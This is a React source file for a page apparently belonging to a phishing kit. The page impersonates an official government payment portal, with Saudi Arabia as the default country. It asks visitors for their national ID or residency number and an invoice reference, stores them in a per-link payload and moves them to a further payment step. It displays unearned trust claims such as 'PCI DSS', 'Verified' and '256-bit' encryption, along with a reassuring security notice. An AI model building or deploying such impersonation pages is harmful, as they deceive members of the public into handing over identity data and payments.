import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import {
  FileText,
  Loader2,
  ShieldCheck,
  ArrowLeft,
  Lock,
  Landmark,
  Info,
  CheckCircle,
  AlertCircle
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { formatCurrency } from "@/lib/countryCurrencies";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [reference, setReference] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const countryCode = link?.country_code || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);

  useEffect(() => {
    if (link?.payload?.reference) {
      setReference(link.payload.reference);
    }
  }, [link]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!reference || !nationalId) {
      toast({ title: "تنبيه", description: "يرجى تعبئة كافة الحقول المطلوبة للمتابعة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...link?.payload, reference, nationalId }
      });

      navigate(`/pay/${id}/recipient`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isLoading || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-10 h-10 animate-spin" style={{ color: govSystem.colors.primary }} />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 pb-20" dir="rtl" style={{ fontFamily: govSystem.fonts.primaryAr }}>
      {/* Official Government Header */}
      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <BackButton />
             <div className="w-12 h-12 rounded-xl flex items-center justify-center text-white shadow-lg shadow-gray-200" style={{ background: govSystem.colors.primary }}>
                <Landmark className="w-6 h-6" />
             </div>
             <div>
                <h1 className="text-xl font-black text-gray-800">بوابة الاستعلام والسداد</h1>
                <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{govSystem.nameEn} INTEGRATED SYSTEM</p>
             </div>
          </div>
          {govSystem.logo && <img src={govSystem.logo} className="h-10 w-auto object-contain" alt="" />}
        </div>
      </header>

      <div className="container mx-auto px-4 py-12">
         <div className="max-w-2xl mx-auto space-y-10">
            <div className="text-center space-y-2">
               <h2 className="text-3xl font-black text-gray-800">الاستعلام عن المستحقات</h2>
               <p className="text-gray-500 font-bold text-lg">يرجى إدخال بيانات الهوية ومرجع الخدمة للتحقق</p>
            </div>

            <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white relative overflow-hidden">
               <div className="absolute top-0 right-0 w-32 h-32 opacity-[0.03] -mr-16 -mt-16 rounded-full" style={{ background: govSystem.colors.primary }} />

               <form onSubmit={handleSubmit} className="space-y-8 relative z-10">
                  <div className="space-y-6">
                     <div className="space-y-2">
                        <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">رقم الهوية الوطنية / الإقامة</Label>
                        <Input
                          value={nationalId}
                          onChange={(e) => setNationalId(e.target.value)}
                          className="h-16 border-2 rounded-2xl font-black text-2xl text-center bg-gray-50 focus:bg-white transition-all tracking-[0.2em]"
                          placeholder="XXXXXXXXXX"
                          maxLength={10}
                          required
                        />
                     </div>

                     <div className="space-y-2">
                        <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">رقم الفاتورة / المرجع</Label>
                        <div className="relative group">
                           <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                           <Input
                             value={reference}
                             onChange={(e) => setReference(e.target.value)}
                             className="h-16 pr-14 border-2 rounded-2xl font-black text-xl bg-gray-50 focus:bg-white transition-all"
                             placeholder="أدخل الرقم المرجعي للخدمة"
                             required
                           />
                        </div>
                     </div>
                  </div>

                  <div className="bg-blue-50 p-6 rounded-3xl border border-blue-100 space-y-4">
                     <div className="flex items-center gap-3">
                        <Info className="w-5 h-5 text-blue-600" />
                        <p className="text-sm font-black text-blue-800">معلومات الفاتورة</p>
                     </div>
                     <div className="flex justify-between items-center text-sm font-bold">
                        <span className="text-blue-600/70">المبلغ المستحق:</span>
                        <span className="text-2xl font-black text-blue-800">{formatCurrency(link.payload.payment_amount, link.payload.currency_code)}</span>
                     </div>
                  </div>

                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full h-20 rounded-[1.5rem] text-2xl font-black shadow-2xl transition-all hover:translate-y-[-4px] active:translate-y-[2px]"
                    style={{ background: govSystem.gradients.primary, boxShadow: `0 15px 40px -12px ${govSystem.colors.primary}50` }}
                  >
                    {isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "تحقق ومتابعة السداد"}
                  </Button>

                  <div className="flex items-center justify-center gap-4 text-[10px] font-black text-gray-400 uppercase">
                     <div className="flex items-center gap-1"><Lock className="w-3 h-3" /> Encrypted</div>
                     <div className="w-1 h-1 rounded-full bg-gray-300" />
                     <div className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> PCI DSS</div>
                     <div className="w-1 h-1 rounded-full bg-gray-300" />
                     <div className="flex items-center gap-1"><CheckCircle className="w-3 h-3" /> Verified</div>
                  </div>
               </form>
            </Card>

            <div className="p-8 bg-[#1E293B] rounded-[2.5rem] text-white flex items-center gap-8 shadow-xl">
               <div className="w-16 h-16 bg-white/10 rounded-2xl flex items-center justify-center shrink-0 border border-white/20">
                  <AlertCircle className="w-8 h-8 text-amber-400" />
               </div>
               <div>
                  <h4 className="text-lg font-black mb-1">تعليمات الأمن السيبراني</h4>
                  <p className="text-xs opacity-60 font-bold leading-relaxed">
                     تأكد دائماً من وجود علامة القفل في شريط العنوان. لا تشارك بياناتك البنكية مع أي روابط غير رسمية. هذه البوابة مشفرة بمعيار 256-bit.
                  </p>
               </div>
            </div>
         </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default PaymentData;
